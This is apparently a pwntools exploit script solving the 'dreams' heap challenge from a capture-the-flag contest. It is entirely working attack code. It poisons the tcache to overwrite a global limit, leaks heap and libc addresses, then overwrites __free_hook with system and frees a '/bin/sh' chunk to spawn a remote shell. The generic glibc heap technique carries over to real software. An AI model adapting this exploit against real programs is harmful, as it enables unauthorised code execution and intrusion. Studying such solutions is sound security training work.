from pwn import *

# p = process('./dreams')
p = remote('challs.actf.co', 31227)
# p = remote('localhost', 7777)
e = ELF('./dreams')
libc = ELF('./libc.so.6')

one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

sendlineafter = lambda x, y: p.sendlineafter(x, y)
sendafter = lambda x, y: p.sendlineafter(x, y)
recvuntil = lambda x: p.recvuntil(x)

def add(i, date, data):
    sendlineafter(b'> ', b'1')
    sendlineafter(b'? ', str(i))
    sendlineafter(b'? ', date)
    sendlineafter(b'? ', data)

def free(i):
    sendlineafter(b'> ', b'2')
    sendlineafter(b'? ', str(i))

def edit(i, date):
    sendlineafter(b'> ', b'3')
    sendlineafter(b'? ', str(i))
    recvuntil(b'that ')
    out = recvuntil(b'\n')[:-1]
    sendafter(b': ', date)
    return out

# Overwrite MAX_DREAMS
add(0, b'A', b'A')
add(1, b'A', b'A')
free(0)
free(1)
heap = u64(edit(1, p64(e.symbols['MAX_DREAMS']-8)).ljust(8, b'\0')) 
log.info('heap: ' + hex(heap))
add(2, b'A', b'A')
add(3, b'A', b'A')

# libc leak 
for i in range(26):
    add(i+7, b'A', b'A')
free(7)
free(8)
edit(8, p64(heap+0x1370))
add(33, b'A', p64(0x471))
add(34, b'A', b'A')
free(34)
libc.address = u64(edit(34, b'\x00').ljust(8, b'\x00')) - 0x1ecbe0
log.info('libc: ' + hex(libc.address))

# Overwrite __free_hook
free(10)
free(11)
edit(11, p64(libc.symbols['__free_hook']))
add(35, b'/bin/sh', b'A')
sendlineafter(b'> ', b'1')
sendlineafter(b'? ', b'36')
sendlineafter(b'? ', p64(libc.symbols['system']))
free(35)

p.interactive()
